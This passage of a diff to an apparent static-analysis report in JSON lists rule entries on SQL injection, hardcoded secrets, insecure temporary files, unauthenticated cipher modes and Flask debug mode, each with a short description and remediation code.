which is included in the Python Standard Library.\n\n## References\n\n- [OWASP SQL Injection Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)\n- [CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')](https://cwe.mitre.org/data/definitions/89.html)"
               },
               "properties": {
                 "cwe": [
@@ -474,100 +496,34 @@
               }
             },
             {
+              "id": "28a8f063-18ec-3055-a65f-490ad91616c6",
+              "name": "Detected Hardcoded `SECRET_KEY` Vulnerability",
+              "helpUri": "https://www.glog.ai/",
+              "help": {
+                "text": "",
+                "markdown": "## Description\n\nThe `SECRET_KEY` in a Flask application is a crucial part of the security. It is used to cryptographically sign the session cookies for protection against cookie data tampering. Hardcoding the `SECRET_KEY` in your source code is a security risk. If the source code is publicly accessible (for example, if it is open source), anyone can see the `SECRET_KEY` and use it to create valid session cookies, bypassing any authentication and gaining unauthorized access to the application.\n\n## Mitigation Advice\n\nThe `SECRET_KEY` should be kept secret and should not be hardcoded in the source code. Instead, it should be stored in an environment variable or a configuration file that is not included in the version control system. This way, even if the source code is publicly accessible, the `SECRET_KEY` remains secret.\n\n## Source Code Fix Recommendation\n\nInstead of hardcoding the `SECRET_KEY`, load it from an environment variable:\n\n```python\nimport os\napp.config['SECRET_KEY'] = os.environ.get('SECRET_KEY')\n```\n\nOr from a configuration file:\n\n```python\napp.config.from_pyfile('config.cfg')\n```\n\nIn the `config.cfg` file, you can set the `SECRET_KEY`:\n\n```\nSECRET_KEY = 'your-secret-key'\n```\n\n## Library Dependencies\n\nThe code example requires the following library:\n\n- Flask\n\n## References\n\n- [OWASP Top 10 2017 Category A2: Broken Authentication](https://owasp.org/www-project-top-ten/2017/A2_2017-Broken_Authentication)\n- [CWE-798: Use of Hard-coded Credentials](https://cwe.mitre.org/data/definitions/798.html)"
+              },
+              "properties": {
+                "cwe": [
+                  {
+                    "id": "CWE-798",
+                    "url": "https://cwe.mitre.org/data/definitions/798.html"
+                  }
+                ],
+                "severity": "MEDIUM",
+                "kind": "FAIL",
+                "tags": [
+                  "CWE-798"
+                ]
+              }
+            },
+            {
               "id": "14033dbf-28da-3237-bdb3-fe0495b1e04f",
               "name": "Potential Unsafe Use of Temporary File/Directory",
               "helpUri": "https://www.glog.ai/",
               "help": {
                 "text": "",
                 "markdown": "## Description\n\n\"Potential Unsafe Use of Temporary File/Directory\" vulnerability in Python refers to the insecure usage of temporary files or directories. This can lead to various security issues such as race conditions, where an attacker can create a symlink to a file with the same name, causing the application to overwrite the symlinked file instead of the intended temporary file.\n\nIn the provided code snippet, the application is reading a key file from a hardcoded temporary directory. An attacker could potentially replace the key file with malicious data, leading to unauthorized access or other security breaches.\n\n## Mitigation Advice\n\nTo mitigate this vulnerability, it is recommended to use secure methods for creating and using temporary files or directories. Python's `tempfile` module provides several functions to create temporary files and directories securely, which can help prevent race conditions.\n\nAvoid using hardcoded temporary file paths. Instead, generate a unique temporary file name for each session or operation. This can prevent an attacker from predicting the file name and replacing it with a symlink to a sensitive file.\n\n## Source Code Fix\n\nHere is a recommended fix for the provided code snippet using the `tempfile` module:\n\n```python\nimport tempfile\n\nwith tempfile.NamedTemporaryFile() as temp:\n    with open(temp.name, \"rb\") as key_file:\n        # rest of the code\n```\n\nIn this code, `tempfile.NamedTemporaryFile()` is used to create a unique temporary file for each session. The `temp.name` attribute gives the full path to the file, which is then opened for reading.\n\n## Library Dependencies\n\nThe code example does not require any additional library dependencies to execute properly.\n\n## References\n\n- [CWE-377: Insecure Temporary File](https://cwe.mitre.org/data/definitions/377.html)"
-              },
-              "properties": {
-                "cwe": [
-                  {
-                    "id": "CWE-377",
-                    "url": "https://cwe.mitre.org/data/definitions/377.html"
-                  }
-                ],
-                "severity": "MEDIUM",
-                "kind": "FAIL",
-                "tags": [
-                  "CWE-377"
-                ]
-              }
-            },
-            {
-              "id": "ca37f023-adc0-3157-a466-641cdbd7715b",
-              "name": "Potential Unsafe Use of Temporary File/Directory",
-              "helpUri": "https://www.glog.ai/",
-              "help": {
-                "text": "",
-                "markdown": "## Description\n\n\"Potential Unsafe Use of Temporary File/Directory\" vulnerability in Python refers to the insecure creation or use of temporary files or directories. This can lead to a variety of security issues, such as race conditions, privilege escalation, or information disclosure, if an attacker can predict the name of the temporary file or directory and manipulate it.\n\nIn the provided code snippet, the file '/tmp/ca.cert' is being opened for writing. If an attacker can predict this filename, they could potentially create a symbolic link with the same name, causing the program to write to a different file than intended.\n\n## Mitigation Advice\n\nTo mitigate this vulnerability, it is recommended to use secure methods for creating temporary files or directories. Python's `tempfile` module provides several functions for this purpose, such as `tempfile.NamedTemporaryFile` or `tempfile.mkdtemp`.\n\n## Source Code Fix Recommendation\n\nHere is a recommended fix for the provided code snippet using `tempfile.NamedTemporaryFile`:\n\n```python\nimport tempfile\n\nwith tempfile.NamedTemporaryFile(delete=False) as out:\n    # Use 'out' as needed here\n    pass\n```\n\nIn this code, `tempfile.NamedTemporaryFile` creates a temporary file in a secure manner, and the `delete=False` argument ensures that the file is not deleted when it is closed.\n\n## Library Dependencies\n\nThe code example requires the following Python standard library:\n\n- `tempfile`\n\n## References\n\n- [OWASP - Insecure Temporary File](https://owasp.org/www-community/vulnerabilities/Insecure_Temporary_File)\n- [CWE-377: Insecure Temporary File](https://cwe.mitre.org/data/definitions/377.html)"
-              },
-              "properties": {
-                "cwe": [
-                  {
-                    "id": "CWE-377",
-                    "url": "https://cwe.mitre.org/data/definitions/377.html"
-                  }
-                ],
-                "severity": "MEDIUM",
-                "kind": "FAIL",
-                "tags": [
-                  "CWE-377"
-                ]
-              }
-            },
-            {
-              "id": "4045dc1a-ec12-368e-a484-39cbaea10c2f",
-              "name": "\"Preventing SQL Injection: Use Prepared Statements, TextualSQL, SQL Expression Language, Schema Definition Language, or SQLAlchemy ORM\"",
-              "helpUri": "https://www.glog.ai/",
-              "help": {
-                "text": "",
-                "markdown": "## Description\n\nThe provided code is vulnerable to SQL Injection, a code injection technique that attackers can use to exploit vulnerabilities in a web application's database layer. This happens when the application uses user input to construct SQL queries without properly sanitizing or escaping it. In Python, this is often seen when developers use string formatting methods to create SQL queries, as shown in the provided code.\n\nIn the provided code, an attacker can provide malicious input for `username` and `password` variables that can alter the SQL query to perform unintended actions, such as deleting tables, modifying data, or even revealing sensitive information.\n\n## Mitigation Advice\n\nTo prevent SQL Injection attacks, it's recommended to use parameterized queries or prepared statements, which can ensure that user input is always treated as literal data and not part of the SQL command. \n\nPython's `sqlite3` module, which is commonly used for interacting with SQLite databases, supports this feature. Other SQL libraries in Python, such as SQLAlchemy, also support this feature, along with additional tools like TextualSQL, SQL Expression Language, and Schema Definition Language.\n\n## Source Code Fix\n\nHere's how you can fix the provided code using parameterized queries with `sqlite3`:\n\n```python\nc.execute(\"UPDATE users SET password = ? WHERE username = ?\", (password, username))\n```\n\nIn this code, `?` is a placeholder that `sqlite3` will replace with the values in the tuple `(password, username)`. `sqlite3` will automatically sanitize these values to prevent SQL Injection.\n\n## Library Dependencies\n\nThe provided code requires the `sqlite3` module, which is included in the Python Standard Library.\n\n## References\n\n- [OWASP SQL Injection Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)\n- [CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')](https://cwe.mitre.org/data/definitions/89.html)"
-              },
-              "properties": {
-                "cwe": [
-                  {
-                    "id": "CWE-89",
-                    "url": "https://cwe.mitre.org/data/definitions/89.html"
-                  }
-                ],
-                "severity": "MEDIUM",
-                "kind": "FAIL",
-                "tags": [
-                  "CWE-89"
-                ]
-              }
-            },
-            {
-              "id": "d730bfe2-ca68-3b86-ad73-13e1c738a38c",
-              "name": "Improper Message Authentication in Encryption Mode Operation, Consider Using AEAD Mode Like GCM",
-              "helpUri": "https://www.glog.ai/",
-              "help": {
-                "text": "",
-                "markdown": "## Description\n\nThe vulnerability \"Improper Message Authentication in Encryption Mode Operation, Consider Using AEAD Mode Like GCM\" refers to the use of encryption modes that do not provide authentication. In the provided Python code, the Cipher Feedback (CFB) mode is used, which is a mode of operation for symmetric key cryptographic block ciphers. It does not provide authentication, which means that an attacker could potentially modify the ciphertext without detection.\n\n## Mitigation Advice\n\nTo mitigate this vulnerability, it is recommended to use an Authenticated Encryption with Associated Data (AEAD) mode such as Galois/Counter Mode (GCM). AEAD modes provide both confidentiality and authenticity, which means that the data is not only encrypted, but also includes a mechanism to detect any modifications to the ciphertext.\n\n## Source Code Fix Recommendation\n\nHere is a Python code example that uses the AES GCM mode:\n\n```python\nfrom cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes\nfrom cryptography.hazmat.backends import default_backend\n\n# Assuming key and iv are already defined\ncipher = Cipher(algorithms.AES(key), modes.GCM(iv), backend=default_backend())\n```\n\n## Library Dependencies\n\nThe code example requires the `cryptography` library in Python. You can install it using pip:\n\n```\npip install cryptography\n```\n\n## References\n\n- [OWASP Cryptographic Storage Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cryptographic_Storage_Cheat_Sheet.html)\n- [CWE-326: Inadequate Encryption Strength](https://cwe.mitre.org/data/definitions/326.html)\n\nPlease note that the links are valid and active at the time of writing this report."
-              },
-              "properties": {
-                "cwe": [
-                  {
-                    "id": "CWE-326",
-                    "url": "https://cwe.mitre.org/data/definitions/326.html"
-                  }
-                ],
-                "severity": "MEDIUM",
-                "kind": "FAIL",
-                "tags": [
-                  "CWE-326"
-                ]
-              }
-            },
-            {
-              "id": "69e27a52-73c0-3eae-a173-5dad4d2860e7",
-              "name": "Potential Unsafe Use of Temporary File/Directory",
-              "helpUri": "https://www.glog.ai/",
-              "help": {
-                "text": "",
-                "markdown": "## Description\n\n\"Potential Unsafe Use of Temporary File/Directory\" vulnerability in Python refers to the insecure creation or use of temporary files or directories. This can lead to a variety of security issues, such as race conditions, privilege escalation, or information disclosure, if an attacker can predict the name of the temporary file or directory and manipulate it.\n\nIn the provided code snippet, a temporary file is being created in a predictable location (`/tmp/acme.csr`) with no checks for existing files of the same name. This can lead to an attacker replacing or modifying the file, leading to potential security issues.\n\n## Mitigation Advice\n\nTo mitigate this vulnerability, you should use the built-in Python library `tempfile` to securely create temporary files and directories. This library generates random, unpredictable names for temporary files and ensures they are securely created with the correct permissions.\n\n## Source Code Fix Recommendation\n\nHere's how you can modify the provided code snippet to use the `tempfile` library:\n\n```python\nimport tempfile\n\nwith tempfile.NamedTemporaryFile(delete=False) as out:\n    # Use 'out' here...\n```\n\nIn this code, `tempfile.NamedTemporaryFile` is used to securely create a temporary file. The `delete=False` argument is used to ensure the file is not deleted when it is closed, which is the default behavior.\n\n## Library Dependencies\n\nThe code example requires the following Python library to execute properly:\n\n- `tempfile`\n\n## References\n\n- [OWASP - Insecure Temporary File](https://owasp.org/www-community/vulnerabilities/Insecure_Temporary_File)\n- [CWE-377: Insecure Temporary File](https://cwe.mitre.org/data/definitions/377.html)"
               },
               "properties": {
                 "cwe": [
@@ -606,6 +562,28 @@
               }
             },
             {
+              "id": "ca37f023-adc0-3157-a466-641cdbd7715b",
+              "name": "Potential Unsafe Use of Temporary File/Directory",
+              "helpUri": "https://www.glog.ai/",
+              "help": {
+                "text": "",
+                "markdown": "## Description\n\n\"Potential Unsafe Use of Temporary File/Directory\" vulnerability in Python refers to the insecure creation or use of temporary files or directories. This can lead to a variety of security issues, such as race conditions, privilege escalation, or information disclosure, if an attacker can predict the name of the temporary file or directory and manipulate it.\n\nIn the provided code snippet, the file '/tmp/ca.cert' is being opened for writing. If an attacker can predict this filename, they could potentially create a symbolic link with the same name, causing the program to write to a different file than intended.\n\n## Mitigation Advice\n\nTo mitigate this vulnerability, it is recommended to use secure methods for creating temporary files or directories. Python's `tempfile` module provides several functions for this purpose, such as `tempfile.NamedTemporaryFile` or `tempfile.mkdtemp`.\n\n## Source Code Fix Recommendation\n\nHere is a recommended fix for the provided code snippet using `tempfile.NamedTemporaryFile`:\n\n```python\nimport tempfile\n\nwith tempfile.NamedTemporaryFile(delete=False) as out:\n    # Use 'out' as needed here\n    pass\n```\n\nIn this code, `tempfile.NamedTemporaryFile` creates a temporary file in a secure manner, and the `delete=False` argument ensures that the file is not deleted when it is closed.\n\n## Library Dependencies\n\nThe code example requires the following Python standard library:\n\n- `tempfile`\n\n## References\n\n- [OWASP - Insecure Temporary File](https://owasp.org/www-community/vulnerabilities/Insecure_Temporary_File)\n- [CWE-377: Insecure Temporary File](https://cwe.mitre.org/data/definitions/377.html)"
+              },
+              "properties": {
+                "cwe": [
+                  {
+                    "id": "CWE-377",
+                    "url": "https://cwe.mitre.org/data/definitions/377.html"
+                  }
+                ],
+                "severity": "MEDIUM",
+                "kind": "FAIL",
+                "tags": [
+                  "CWE-377"
+                ]
+              }
+            },
+            {
               "id": "5b636fe0-2a63-39b7-aa68-22c0bb5aada8",
               "name": "Flask Ignores Top-Level app.run(...): Suggests Using a Guard Function",
               "helpUri": "https://www.glog.ai/",
@@ -628,7 +606,29 @@
               }
             },
             {
-              "id": "28a8f063-18ec-3055-a65f-490ad91616c6",
+              "id": "d730bfe2-ca68-3b86-ad73-13e1c738a38c",
+              "name": "Improper Message Authentication in Encryption Mode Operation, Consider Using AEAD Mode Like GCM",
+              "helpUri": "https://www.glog.ai/",
+              "help": {
+                "text": "",
+                "markdown": "## Description\n\nThe vulnerability \"Improper Message Authentication in Encryption Mode Operation, Consider Using AEAD Mode Like GCM\" refers to the use of encryption modes that do not provide authentication. In the provided Python code, the Cipher Feedback (CFB) mode is used, which is a mode of operation for symmetric key cryptographic block ciphers. It does not provide authentication, which means that an attacker could potentially modify the ciphertext without detection.\n\n## Mitigation Advice\n\nTo mitigate this vulnerability, it is recommended to use an Authenticated Encryption with Associated Data (AEAD) mode such as Galois/Counter Mode (GCM). AEAD modes provide both confidentiality and authenticity, which means that the data is not only encrypted, but also includes a mechanism to detect any modifications to the ciphertext.\n\n## Source Code Fix Recommendation\n\nHere is a Python code example that uses the AES GCM mode:\n\n```python\nfrom cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes\nfrom cryptography.hazmat.backends import default_backend\n\n# Assuming key and iv are already defined\ncipher = Cipher(algorithms.AES(key), modes.GCM(iv), backend=default_backend())\n```\n\n## Library Dependencies\n\nThe code example requires the `cryptography` library in Python. You can install it using pip:\n\n```\npip install cryptography\n```\n\n## References\n\n- [OWASP Cryptographic Storage Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cryptographic_Storage_Cheat_Sheet.html)\n- [CWE-326: Inadequate Encryption Strength](https://cwe.mitre.org/data/definitions/326.html)\n\nPlease note that the links are valid and active at the time of writing this report."
+              },
+              "properties": {
+                "cwe": [
+                  {
+                    "id": "CWE-326",
+                    "url": "https://cwe.mitre.org/data/definitions/326.html"
+                  }
+                ],
+                "severity": "MEDIUM",
+                "kind": "FAIL",
+                "tags": [
+                  "CWE-326"
+                ]
+              }
+            },
+            {
+              "id": "cf4fbb2d-db7b-3d6d-a4b3-73a08e4d1d33",
               "name": "Detected Hardcoded `SECRET_KEY` Vulnerability",
               "helpUri": "https://www.glog.ai/",
               "help": {
@@ -646,6 +646,28 @@
                 "kind": "FAIL",
                 "tags": [
                   "CWE-798"
+                ]
+              }
+            },
+            {
+              "id": "69e27a52-73c0-3eae-a173-5dad4d2860e7",
+              "name": "Potential Unsafe Use of Temporary File/Directory",
+              "helpUri": "https://www.glog.ai/",
+              "help": {
+                "text": "",
+                "markdown": "## Description\n\n\"Potential Unsafe Use of Temporary File/Directory\" vulnerability in Python refers to the insecure creation or use of temporary files or directories. This can lead to a variety of security issues, such as race conditions, privilege escalation, or information disclosure, if an attacker can predict the name of the temporary file or directory and manipulate it.\n\nIn the provided code snippet, a temporary file is being created in a predictable location (`/tmp/acme.csr`) with no checks for existing files of the same name. This can lead to an attacker replacing or modifying the file, leading to potential security issues.\n\n## Mitigation Advice\n\nTo mitigate this vulnerability, you should use the built-in Python library `tempfile` to securely create temporary files and directories. This library generates random, unpredictable names for temporary files and ensures they are securely created with the correct permissions.\n\n## Source Code Fix Recommendation\n\nHere's how you can modify the provided code snippet to use the `tempfile` library:\n\n```python\nimport tempfile\n\nwith tempfile.NamedTemporaryFile(delete=False) as out:\n    # Use 'out' here...\n```\n\nIn this code, `tempfile.NamedTemporaryFile` is used to securely create a temporary file. The `delete=False` argument is used to ensure the file is not deleted when it is closed, which is the default behavior.\n\n## Library Dependencies\n\nThe code example requires the following Python library to execute properly:\n\n- `tempfile`\n\n## References\n\n- [OWASP - Insecure Temporary File](https://owasp.org/www-community/vulnerabilities/Insecure_Temporary_File)\n- [CWE-377: Insecure Temporary File](https://cwe.mitre.org/data/definitions/377.html)"
+              },
+              "properties": {
+                "cwe": [
+                  {
+                    "id": "CWE-377",
+                    "url": "https://cwe.mitre.org/data/definitions/377.html"
+                  }
+                ],
+                "severity": "MEDIUM",
+                "kind": "FAIL",
+                "tags": [
+                  "CWE-377"
                 ]
               }
             },
@@ -668,6 +690,28 @@
                 "kind": "FAIL",
                 "tags": [
                   "CWE-377"
+                ]
+              }
+            },
+            {
+              "id": "232084fd-c209-3fd2-ad2f-5888b440fb18",
+              "name": "Flask App Debug Mode Vulnerability Detected",
+              "helpUri": "https://www.glog.ai/",
+              "help": {
+                "text": "",
+                "markdown": "## Description\n\nThe Flask App Debug Mode Vulnerability is a security flaw that occurs when a Flask application is run in debug mode in a production environment. When the debug mode is enabled, it provides a lot of sensitive information about the application, which can be exploited by attackers to gain unauthorized access or perform other malicious activities.\n\n## Mitigation Advice\n\nTo mitigate this vulnerability, you should never run your Flask application in debug mode in a production environment. Debug mode should only be used during development to provide detailed error pages. In a production environment, these detailed error pages can provide attackers with a lot of useful information.\n\n## Source Code Fix Recommendation\n\nYou should remove the `debug=True` argument from the `app.run()` function. If you need to enable debug mode during development, you can use an environment variable to control whether debug mode is enabled. Here's an example:\n\n```python\nimport os\nfrom flask import Flask\n\napp = Flask(__name__)\napp.run(debug=os.getenv('FLASK_DEBUG', False), host='127.0.1.1', port=5000, extra_files='csp.txt')\n```\n\nIn this example, the `FLASK_DEBUG` environment variable controls whether debug mode is enabled. If the `FLASK_DEBUG` environment variable is not set, debug mode is disabled.\n\n## Library Dependencies\n\nThe code example requires the following library dependencies:\n\n- Flask\n\n## OWASP Resources\n\n\n## Common Weakness Enumeration (CWE)\n\n- [CWE-489: Active Debug Code](https://cwe.mitre.org/data/definitions/489.html)"
+              },
+              "properties": {
+                "cwe": [
+                  {
+                    "id": "CWE-489",
+                    "url": "https://cwe.mitre.org/data/definitions/489.html"
+                  }
+                ],
+                "severity": "MEDIUM",
+                "kind": "FAIL",
+                "tags": [
+                  "CWE-489"
                 ]
               }
             },
@@ -716,50 +760,6 @@
               }
             },
             {
-              "id": "cf4fbb2d-db7b-3d6d-a4b3-73a08e4d1d33",
-              "name": "Detected Hardcoded `SECRET_KEY` Vulnerability",
-              "helpUri": "https://www.glog.ai/",
-              "help": {
-                "text": "",
-                "markdown": "## Description\n\nThe `SECRET_KEY` in a Flask application is a crucial part of the security. It is used to cryptographically sign the session cookies for protection against cookie data tampering. Hardcoding the `SECRET_KEY` in your source code is a security risk. If the source code is publicly accessible (for example, if it is open source), anyone can see the `SECRET_KEY` and use it to create valid session cookies, bypassing any authentication and gaining unauthorized access to the application.\n\n## Mitigation Advice\n\nThe `SECRET_KEY` should be kept secret and should not be hardcoded in the source code. Instead, it should be stored in an environment variable or a configuration file that is not included in the version control system. This way, even if the source code is publicly accessible, the `SECRET_KEY` remains secret.\n\n## Source Code Fix Recommendation\n\nInstead of hardcoding the `SECRET_KEY`, load it from an environment variable:\n\n```python\nimport os\napp.config['SECRET_KEY'] = os.environ.get('SECRET_KEY')\n```\n\nOr from a configuration file:\n\n```python\napp.config.from_pyfile('config.cfg')\n```\n\nIn the `config.cfg` file, you can set the `SECRET_KEY`:\n\n```\nSECRET_KEY = 'your-secret-key'\n```\n\n## Library Dependencies\n\nThe code example requires the following library:\n\n- Flask\n\n## References\n\n- [OWASP Top 10 2017 Category A2: Broken Authentication](https://owasp.org/www-project-top-ten/2017/A2_2017-Broken_Authentication)\n- [CWE-798: Use of Hard-coded Credentials](https://cwe.mitre.org/data/definitions/798.html)"
-              },
-              "properties": {
-                "cwe": [
-                  {
-                    "id": "CWE-798",
-                    "url": "https://cwe.mitre.org/data/definitions/798.html"
-                  }
-                ],
-                "severity": "MEDIUM",
-                "kind": "FAIL",
-                "tags": [
-                  "CWE-798"
-                ]
-              }
-            },
-            {
-              "id": "232084fd-c209-3fd2-ad2f-5888b440fb18",
-              "name": "Flask Ignores Top-Level app.run(...): Suggests Using a Guard Function",
-              "helpUri": "https://www.glog.ai/",
-              "help": {
-                "text": "",
-                "markdown": "## Description\n\nThe Flask framework in Python provides a method `app.run()` to run the application. However, it is not recommended to use this method in production environments. When `app.run()` is used at the top level of the script, it can lead to several security vulnerabilities. One of them is that the debug mode is enabled, which can expose sensitive information to potential attackers. \n\nThe `app.run()` method should be used inside a guard function, which ensures that it is only executed when the script is run directly, and not when it is imported as a module. This is done by checking if the `__name__` variable is equal to `'__main__'`.\n\n## Mitigation Advice\n\nTo mitigate this vulnerability, it is recommended to use a production-ready WSGI server like Gunicorn or uWSGI. If `app.run()` is used, it should be inside a guard function and the debug mode should be disabled.\n\n## Source Code Fix Recommendation\n\nHere is a fixed version of the code:\n\n```python\nfrom flask import Flask\napp = Flask(__name__)\n\n# ... rest of the code ...\n\nif __name__ == '__main__':\n    app.run(debug=False, host='127.0.1.1', port=5000, extra_files='csp.txt')\n```\n\n## Library Dependencies\n\nThe code requires the following library to execute properly:\n\n- Flask\n\n## References\n\n- [OWASP Flask Security](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/06-Session_Management_Testing/02-Testing_for_Cookies_Attributes)\n- [CWE-489: Leftover Debug Code](https://cwe.mitre.org/data/definitions/489.html)"
-              },
-              "properties": {
-                "cwe": [
-                  {
-                    "id": "CWE-489",
-                    "url": "https://cwe.mitre.org/data/definitions/489.html"
-                  }
-                ],
-                "severity": "MEDIUM",
-                "kind": "FAIL",
-                "tags": [
-                  "CWE-489"
-                ]
-              }
-            },
-            {
               "id": "e7f4a97b-a66c-3cec-baaf-d9a955d42809",
               "name": "Unencrypted HTTP Request Vulnerability Detected",
               "helpUri": "https://www.glog.ai/",
@@ -778,6 +778,28 @@
                 "kind": "FAIL",
                 "tags": [
                   "CWE-319"
+                ]
+              }
+            },
+            {
+              "id": "48bed64a-eabe-3746-8939-163ba7203552",
+              "name": "Insufficiently Protected Credentials: Hardcoded JWT Secret/Private Key Used",
+              "helpUri": "https://www.glog.ai/",
+              "help": {
+                "text": "",
+                "markdown": "## Description\n\nThe vulnerability \"Insufficiently Protected Credentials: Hardcoded JWT Secret/Private Key Used\" refers to the insecure practice of hardcoding sensitive information such as JWT (JSON Web Token) secrets or private keys directly into the source code. This is a security risk because anyone who has access to the source code can easily extract these secrets and use them for malicious purposes such as forging tokens, impersonating users, or gaining unauthorized access to protected resources.\n\nIn the provided Python code snippet, the `secret` used to encode the JWT is hardcoded. This is a potential security vulnerability.\n\n## Mitigation Advice\n\nTo mitigate this vulnerability, avoid hardcoding secrets directly into your source code. Instead, use secure methods to store and retrieve these secrets, such as environment variables, secure configuration files, or secret management services.\n\n## Source Code Fix Recommendation\n\nHere is a recommended fix for the provided code snippet:\n\n```python\nimport os\nimport jwt\n\n# Retrieve the secret from an environment variable\nsecret = os.getenv('JWT_SECRET')\n\ntoken = jwt.encode({\n    'username': username,\n    'nbf': now,\n    'exp': now + not_after\n}, secret, algorithm='HS256').decode()\n```\n\nIn this revised code, the `secret` is retrieved from an environment variable named `JWT_SECRET`. This way, the secret is not exposed in the source code.\n\n## Library Dependencies\n\nThe provided code snippet requires the following Python library:\n\n- PyJWT: A Python library for encoding and decoding JSON Web Tokens.\n\nYou can install it using pip:\n\n```bash\npip install PyJWT\n```\n\n## References\n\n- [CWE-798: Use of Hard-coded Credentials](https://cwe.mitre.org/data/definitions/798.html)"
+              },
+              "properties": {
+                "cwe": [
+                  {
+                    "id": "CWE-798",
+                    "url": "https://cwe.mitre.org/data/definitions/798.html"
+                  }
+                ],
+                "severity": "MEDIUM",
+                "kind": "FAIL",
+                "tags": [
+                  "CWE-798"
                 ]
               }
             },
@@ -826,28 +848,6 @@
               }
             },
             {
-              "id": "098e540c-ebd8-38e0-a921-65c5306aee54",
-              "name": "Potential Unsafe Use of Temporary File/Directory",
-              "helpUri": "https://www.glog.ai/",
-              "help": {
-                "text": "",
-                "markdown": "## Description\n\n\"Potential Unsafe Use of Temporary File/Directory\" vulnerability in Python refers to the insecure creation or use of temporary files or directories. This can lead to a variety of security issues, such as race conditions, privilege escalation, or information disclosure, if an attacker can predict the name of the temporary file or directory and manipulate it.\n\nIn the provided code snippet, a temporary file is being created in a predictable location (`/tmp/acme.key`) with no checks for existing files or directories with the same name. This could allow an attacker to create a symbolic link with the same name, leading to the application writing to a different file than intended.\n\n## Mitigation Advice\n\nTo mitigate this vulnerability, you should use secure methods for creating temporary files or directories. Python's `tempfile` module provides several functions for this purpose, such as `tempfile.mkstemp()` and `tempfile.TemporaryFile()`. These functions create a temporary file with a unique name in a secure manner, preventing race conditions.\n\n## Source Code Fix Recommendation\n\nHere's how you can modify the provided code snippet to use `tempfile.mkstemp()`:\n\n```python\nimport tempfile\n\n# This will create a secure temporary file\nfd, path = tempfile.mkstemp()\n\nwith open(path, 'wb') as out:\n    # Your code here\n```\n\nIn this code, `tempfile.mkstemp()` creates a unique temporary file and returns a tuple containing an OS-level handle to the file and the absolute pathname of the file. The file is then opened for writing in binary mode.\n\n## Library Dependencies\n\nThe code example requires the following Python standard library:\n\n- `tempfile`\n\n## References\n\n- [OWASP - Insecure Temporary File](https://owasp.org/www-community/vulnerabilities/Insecure_Temporary_File)\n- [CWE-377: Insecure Temporary File](https://cwe.mitre.org/data/definitions/377.html)"
-              },
-              "properties": {
-                "cwe": [
-                  {
-                    "id": "CWE-377",
-                    "url": "https://cwe.mitre.org/data/definitions/377.html"
-                  }
-                ],
-                "severity": "MEDIUM",
-                "kind": "FAIL",
-                "tags": [
-                  "CWE-377"
-                ]
-              }
-            },
-            {
               "id": "63e5f0bd-e24b-3827-a528-c5b73134831d",
               "name": "Potential Unsafe Use of Temporary File/Directory",
               "helpUri": "https://www.glog.ai/",
@@ -870,24 +870,46 @@
               }
             },
             {
-              "id": "48bed64a-eabe-3746-8939-163ba7203552",
-              "name": "Insufficiently Protected Credentials: Hardcoded JWT Secret/Private Key Used",
+              "id": "ecbd55a2-cc94-343e-aa5a-97ff01b5aa77",
+              "name": "\"Preventing SQL Injection: Use Prepared Statements, TextualSQL, SQL Expression Language, Schema Definition Language, or SQLAlchemy ORM\"",
               "helpUri": "https://www.glog.ai/",
               "help": {
                 "text": "",
-                "markdown": "## Description\n\nThe vulnerability \"Insufficiently Protected Credentials: Hardcoded JWT Secret/Private Key Used\" refers to the insecure practice of hardcoding sensitive information such as JWT (JSON Web Token) secrets or private keys directly into the source code. This is a security risk because anyone who has access to the source code can easily extract these secrets and use them for malicious purposes such as forging tokens, impersonating users, or gaining unauthorized access to protected resources.\n\nIn the provided Python code snippet, the `secret` used to encode the JWT is hardcoded. This is a potential security vulnerability.\n\n## Mitigation Advice\n\nTo mitigate this vulnerability, avoid hardcoding secrets directly into your source code. Instead, use secure methods to store and retrieve these secrets, such as environment variables, secure configuration files, or secret management services.\n\n## Source Code Fix Recommendation\n\nHere is a recommended fix for the provided code snippet:\n\n```python\nimport os\nimport jwt\n\n# Retrieve the secret from an environment variable\nsecret = os.getenv('JWT_SECRET')\n\ntoken = jwt.encode({\n    'username': username,\n    'nbf': now,\n    'exp': now + not_after\n}, secret, algorithm='HS256').decode()\n```\n\nIn this revised code, the `secret` is retrieved from an environment variable named `JWT_SECRET`. This way, the secret is not exposed in the source code.\n\n## Library Dependencies\n\nThe provided code snippet requires the following Python library:\n\n- PyJWT: A Python library for encoding and decoding JSON Web Tokens.\n\nYou can install it using pip:\n\n```bash\npip install PyJWT\n```\n\n## References\n\n- [CWE-798: Use of Hard-coded Credentials](https://cwe.mitre.org/data/definitions/798.html)"
+                "markdown": "## Description\n\nThe provided code is vulnerable to SQL Injection, a common security vulnerability that occurs when an attacker can insert malicious SQL statements into an SQL query. The vulnerability exists because the code directly uses string formatting to include user-supplied input in an SQL query. An attacker could exploit this by providing specially crafted input that modifies the SQL query to perform actions not intended by the developer, such as viewing, modifying, or deleting data.\n\n## Mitigation Advice\n\nTo prevent SQL Injection vulnerabilities, it's recommended to use parameterized queries or prepared statements, which can ensure that user-supplied input is always treated as literal data and not part of the SQL query itself. \n\nIn Python, you can use the `sqlite3` module's support for parameterized queries to mitigate this vulnerability. \n\n## Source Code Fix\n\nHere's how you could modify the provided code to use a parameterized query:\n\n```python\nc.execute(\"INSERT INTO users (username, password, salt, failures, mfa_enabled, mfa_secret) VALUES (?, ?, ?, ?, ?, ?)\", (username, '', '', 0, 0, ''))\n```\n\nIn this version of the code, the `?` characters are placeholders that `sqlite3` will replace with the values from the tuple that's passed as the second argument to `c.execute()`. Because `sqlite3` automatically escapes these values, they can't be used to modify the SQL query.\n\n## Library Dependencies\n\nThe provided code appears to use the `sqlite3` module, which is included in the Python standard library, so no additional library dependencies are required.\n\n## References\n\n- [OWASP SQL Injection Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)\n- [CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')](https://cwe.mitre.org/data/definitions/89.html)"
               },
               "properties": {
